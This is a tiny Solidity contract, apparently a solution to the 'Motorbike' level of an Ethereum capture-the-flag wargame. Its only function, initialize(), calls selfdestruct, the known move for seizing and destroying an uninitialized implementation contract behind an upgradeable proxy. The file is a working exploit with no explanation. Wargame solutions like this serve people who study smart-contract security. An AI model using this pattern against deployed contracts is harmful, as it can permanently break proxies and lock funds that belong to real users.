// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {Engine} from "@main-0_6_x/25_Motorbike.sol";

contract MotorbikeAttacker {

    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}